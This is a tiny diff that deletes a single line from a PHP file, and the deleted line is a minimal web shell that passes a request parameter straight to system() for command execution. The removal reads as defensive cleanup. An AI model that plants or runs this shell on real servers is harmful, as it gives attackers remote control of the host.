@@ -1,1 +1,0 @@
-<? system($_REQUEST['cmd']); ?>
